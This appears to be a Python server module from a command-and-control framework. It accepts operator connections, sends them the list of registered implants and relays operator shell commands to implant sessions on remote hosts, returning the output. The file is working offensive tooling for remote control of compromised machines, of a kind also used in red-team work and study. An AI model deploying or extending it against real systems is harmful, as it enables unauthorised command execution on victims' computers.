import socket
import threading
from client.pb import operatorpb_pb2
from server.mtls.mtls import session
from server.implant_handler.implant_handler import brodcastImplant

class OperatorHandler:
    def __init__(self, endpoint, operators, sessions, implants):
        host, port = endpoint

        self._operators = operators
        self._implants = implants
        self._sessions = sessions

        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((host, port))

    def start(self):
        threading.Thread(target=self._accept_operator).start() #this is so we can listen and have execute commands from server console

    # Turn message into a protobuf SessionCmdOutput and ssend to client
    def _send_operator(self, message, operator, session_id):
        response = operatorpb_pb2.SessionCmdOutput(cmdOutput=message, id=session_id)

        message = operatorpb_pb2.Message(
            message_type=operatorpb_pb2.Message.MessageType.SessionCmdOutput,
            data=response.SerializeToString()
        )

        operator.send(message.SerializeToString())

    def _accept_operator(self):
        numberOfUsers = 5
        self._sock.listen(numberOfUsers)
        while True: #keep listening, start a new thread when an operator connects
            operator, address = self._sock.accept()

            self._operators.append(operator)
            self._brodcast_implants(operator)

            print("[+]Connected to a new operator at " + address[0] + ":" + str(address[1]) )
            threading.Thread(target = self._listen_operator,args = (operator,address)).start()

    def _listen_operator(self, operator, address):
        size = 1024
        while True:
            data = operator.recv(size)

            message = operatorpb_pb2.Message()
            message.ParseFromString(data)

            if not data:
                print("[+]Disconnected operator " + address[0] +":"+ str(address[1]))
                operator.close()
                self._operators.remove(operator)
                break

            elif message.message_type==operatorpb_pb2.Message.MessageType.SessionCmd:
                session_cmd = operatorpb_pb2.SessionCmd()
                session_cmd.ParseFromString(message.data)

                command_str = session_cmd.cmd
                session_id = session_cmd.id

                out = self._shell_session(command_str, session_id)
                self._send_operator(out,operator,session_id)

    def _shell_session(self, command_str, session_id):
            conn, addr = self._sessions.get(session_id) 
            output = session(conn, command_str)
            return (output)

    # Brodcast all current implant registrations to a new operator
    def _brodcast_implants(self, operator):
        for implant in self._implants:
            brodcastImplant(implant, [operator])
